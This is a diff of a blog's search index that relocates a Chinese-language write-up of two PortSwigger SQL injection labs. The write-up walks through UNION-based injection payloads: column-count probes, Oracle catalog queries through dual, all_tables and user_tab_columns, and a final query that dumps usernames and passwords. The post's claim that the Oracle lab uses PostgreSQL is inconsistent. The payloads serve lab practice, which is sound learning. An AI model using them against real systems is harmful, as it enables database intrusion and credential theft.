@@ -325,63 +325,6 @@ Oracle 每一条 SELECT <strong>必须带 FROM</strong>，不能直接 <code>sel
       </tags>
   </entry>
   <entry>
-    <title>SQL 注入攻击，列出 Oracle 数据库内容和SQL注入UNION攻击，确定查询返回的列数</title>
-    <url>/2026/11/09/portswiggrt-sql-4/</url>
-    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出 Oracle 数据库内容</h1>
-<ul>
-<li>使用portswigger靶场：</li>
-</ul>
-<br>
-<p><strong>Lab: SQL 注入攻击，列出 Oracle 数据库内容</strong><br>
-这是PostgreSQL数据库<br>
-题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
-<p><img src="/image/portswigger-sql-4/1.png" alt="alt text"></p>
-<p>整体思路和步骤和前面那题一样:都是先确定返回的列数，然后查库名，表名，列名，里面的数据，最后脱库，只是payload有一点不同<br>
-先构造: <code>-1'+order+by+1--+</code><br>
-<code>-1'+order+by+2--+</code><br>
-<code>-1'+order+by+3--+</code><br>
-确定有列数为2</p>
-<p>(oracle与其他数据库最大区别就是: <strong>Oracle 每一条 SELECT 必须带 FROM！不能裸写 <code>select 1,2</code>，必须 <code>select 1,2 from </code></strong> dual 是 Oracle 自带的虚表，没有from后面没有东西的时候用)</p>
-<p>然后构造:<code>-1'+union+select+'11',user+from+dual--+</code><br>
-来获取库名<br>
-Oracle 里 <code>user</code> 代表当前用户（等价 MySQL 的 database ()、PG 的 current_schema ()）</p>
-<p><img src="/image/portswigger-sql-4/2.png" alt="alt text"></p>
-<p>然后构造:<code>-1'+union+select+'11',table_name+from+all_tables--+</code>来获取所有表<br>
-也可以将<code>all_tables</code>替换成<code>user_tables</code>来获取当前用户的下面的表</p>
-<p>然后就是:<code>-1'+union+select+'11',column_name+from+user_tab_columns+where+table_name='USERS_XFDNBZ'--+</code>查看表里面的列</p>
-<p><img src="/image/portswigger-sql-4/3.png" alt="alt text"></p>
-<p>最后构造:<code>-1'+union+select+USERNAME_IZZGMA,PASSWORD_EYSFAJ+from+USERS_XFDNBZ--+</code>脱库获取拿到账号密码</p>
-<p><img src="/image/portswigger-sql-4/4.png" alt="alt text"></p>
-<p>用得到的账号密码登入，成功通关</p>
-<p><img src="/image/portswigger-sql-4/5.png" alt="alt text"></p>
-<h1>Lab:SQL注入UNION攻击，确定查询返回的列数</h1>
-<br>
-<p><strong>Lab:SQL注入UNION攻击，确定查询返回的列数</strong></p>
-<p>这一题要求通过通过注入union来查询返回列数</p>
-<p><img src="/image/portswigger-sql-4/1-1.png" alt="alt text"></p>
-<p>构造方式和之前一样，我主要分享一下我遇到的一些问题:</p>
-<p>(1)构造<code>-1' order by 3--+</code>得出返回的列数，但是却不能通关，</p>
-<p>查询一下，发现<strong>必须用 UNION SELECT NULL 这种方式完成攻击才能判定通关</strong>，order by 只是<strong>侦查手段</strong>，不算完成这个实验要求的攻击动作,所以无法通关</p>
-<p><img src="/image/portswigger-sql-4/1-2.png" alt="alt text"></p>
-<p>(2)构造:<code>-1' union selec 'abc','abc','abc'--+</code>会报错</p>
-<p>经过资料查询和尝试，发现是因为<code>abc</code>是字符型，如果原查询列里面是数字型，就会报错,经过测试,我发现第一个空和第三个空是数字型，第二个空不限</p>
-<p><img src="/image/portswigger-sql-4/1-3.png" alt="alt text"><br>
-<img src="/image/portswigger-sql-4/1-4.png" alt="alt text"></p>
-<p>应该是第一个是序号，第二个是商品名称，第三个是价格<br>
-但是使用NULL就不需要考率类型，直接构造<br>
-<code>-1' union select NULL,NULL,NULL--+</code>即可通关</p>
-<p><img src="/image/portswigger-sql-4/1-5.png" alt="alt text"></p>
-]]></content>
-      <categories>
-        <category>SQL注入</category>
-      </categories>
-      <tags>
-        <tag>SQL</tag>
-        <tag>Web</tag>
-        <tag>portswigger</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>sqli-lab-5~6的wp</title>
     <url>/2026/09/27/sqli-lab-5~6/</url>
     <content><![CDATA[<h1>sqli-lab-5~6</h1>
@@ -885,6 +828,63 @@ flag:<code>NSSCTF{60ad8607-7f07-4fc0-ba19-b5a1e232ab99}</code></p>
       <tags>
         <tag>Web</tag>
         <tag>SSTI</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>SQL 注入攻击，列出 Oracle 数据库内容和SQL注入UNION攻击，确定查询返回的列数</title>
+    <url>/2026/11/09/portswigger-sql-4/</url>
+    <content><![CDATA[<h1>Lab: SQL 注入攻击，列出 Oracle 数据库内容</h1>
+<ul>
+<li>使用portswigger靶场：</li>
+</ul>
+<br>
+<p><strong>Lab: SQL 注入攻击，列出 Oracle 数据库内容</strong><br>
+这是PostgreSQL数据库<br>
+题目告诉我们需要通过sql注入获取数据库中的信息,以此来获取所有用户的用户名和密码</p>
+<p><img src="/image/portswigger-sql-4/1.png" alt="alt text"></p>
+<p>整体思路和步骤和前面那题一样:都是先确定返回的列数，然后查库名，表名，列名，里面的数据，最后脱库，只是payload有一点不同<br>
+先构造: <code>-1'+order+by+1--+</code><br>
+<code>-1'+order+by+2--+</code><br>
+<code>-1'+order+by+3--+</code><br>
+确定有列数为2</p>
+<p>(oracle与其他数据库最大区别就是: <strong>Oracle 每一条 SELECT 必须带 FROM！不能裸写 <code>select 1,2</code>，必须 <code>select 1,2 from </code></strong> dual 是 Oracle 自带的虚表，没有from后面没有东西的时候用)</p>
+<p>然后构造:<code>-1'+union+select+'11',user+from+dual--+</code><br>
+来获取库名<br>
+Oracle 里 <code>user</code> 代表当前用户（等价 MySQL 的 database ()、PG 的 current_schema ()）</p>
+<p><img src="/image/portswigger-sql-4/2.png" alt="alt text"></p>
+<p>然后构造:<code>-1'+union+select+'11',table_name+from+all_tables--+</code>来获取所有表<br>
+也可以将<code>all_tables</code>替换成<code>user_tables</code>来获取当前用户的下面的表</p>
+<p>然后就是:<code>-1'+union+select+'11',column_name+from+user_tab_columns+where+table_name='USERS_XFDNBZ'--+</code>查看表里面的列</p>
+<p><img src="/image/portswigger-sql-4/3.png" alt="alt text"></p>
+<p>最后构造:<code>-1'+union+select+USERNAME_IZZGMA,PASSWORD_EYSFAJ+from+USERS_XFDNBZ--+</code>脱库获取拿到账号密码</p>
+<p><img src="/image/portswigger-sql-4/4.png" alt="alt text"></p>
+<p>用得到的账号密码登入，成功通关</p>
+<p><img src="/image/portswigger-sql-4/5.png" alt="alt text"></p>
+<h1>Lab:SQL注入UNION攻击，确定查询返回的列数</h1>
+<br>
+<p><strong>Lab:SQL注入UNION攻击，确定查询返回的列数</strong></p>
+<p>这一题要求通过通过注入union来查询返回列数</p>
+<p><img src="/image/portswigger-sql-4/1-1.png" alt="alt text"></p>
+<p>构造方式和之前一样，我主要分享一下我遇到的一些问题:</p>
+<p>(1)构造<code>-1' order by 3--+</code>得出返回的列数，但是却不能通关，</p>
+<p>查询一下，发现<strong>必须用 UNION SELECT NULL 这种方式完成攻击才能判定通关</strong>，order by 只是<strong>侦查手段</strong>，不算完成这个实验要求的攻击动作,所以无法通关</p>
+<p><img src="/image/portswigger-sql-4/1-2.png" alt="alt text"></p>
+<p>(2)构造:<code>-1' union selec 'abc','abc','abc'--+</code>会报错</p>
+<p>经过资料查询和尝试，发现是因为<code>abc</code>是字符型，如果原查询列里面是数字型，就会报错,经过测试,我发现第一个空和第三个空是数字型，第二个空不限</p>
+<p><img src="/image/portswigger-sql-4/1-3.png" alt="alt text"><br>
+<img src="/image/portswigger-sql-4/1-4.png" alt="alt text"></p>
+<p>应该是第一个是序号，第二个是商品名称，第三个是价格<br>
+但是使用NULL就不需要考率类型，直接构造<br>
+<code>-1' union select NULL,NULL,NULL--+</code>即可通关</p>
+<p><img src="/image/portswigger-sql-4/1-5.png" alt="alt text"></p>
+]]></content>
+      <categories>
+        <category>SQL注入</category>
+      </categories>
+      <tags>
+        <tag>SQL</tag>
+        <tag>Web</tag>
+        <tag>portswigger</tag>
       </tags>
   </entry>
 </search>
